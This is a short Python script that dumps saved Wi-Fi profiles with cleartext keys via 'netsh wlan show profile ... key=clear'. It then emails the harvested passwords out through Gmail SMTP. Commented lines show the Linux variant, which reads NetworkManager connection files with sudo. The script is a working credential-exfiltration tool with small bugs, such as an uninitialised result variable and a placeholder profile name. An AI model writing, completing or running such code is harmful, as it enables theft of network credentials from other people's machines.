#!/usr/bin/env python

import subprocess, smtplib, re

def send_mail(email,password,message):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()


command = "netsh wlan show profile name=SSID_NAME key=clear"

#           LINUX
#command = cd /etc/NetworkManager/system-connections/
#command2 = sudo cat WIFI_SSID_$$!D

networks = subprocess.check_output(command,shell=True)
networks_names_list = re.findall("(?:Profile\s*:\s)(.*)",networks)

for networks_name in networks_names_list:    
    command = "netsh wlan show profile "+networks_name+" key=clear"
    current_result = subprocess.check_output(command,shell=True)
    result = result + current_result

send_mail("example@gmail.com","password",result)
